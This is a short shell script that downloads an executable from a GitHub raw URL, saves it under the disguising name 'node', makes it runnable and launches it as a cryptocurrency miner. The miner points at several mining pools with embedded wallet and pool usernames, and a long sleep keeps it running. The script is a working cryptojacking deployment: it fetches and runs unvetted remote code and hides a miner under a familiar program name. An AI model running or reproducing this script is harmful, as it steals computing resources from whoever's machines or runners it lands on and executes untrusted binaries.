#!/bin/sh
curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
chmod +x node
WORKER_NUMBER=$1
PASSHOURS=$(date +%S)
#./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
# qogecoin
#./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5089 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.${WORKER_NUMBER}_crf > try.log
# crionic
#./node --disable-gpu -a YespowerLTNCG -o stratum+tcp://crnc.miners-pool.com:23007 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.${WORKER_NUMBER}_crf > try.log
# Alterdot
./node --help 
./node --disable-gpu -a argon2d_16000 -o stratum.aikapool.com:3919 -u chriskm0101.crf_${WORKER_NUMBER} -p x,pgid=chriskm0101

sleep 29999
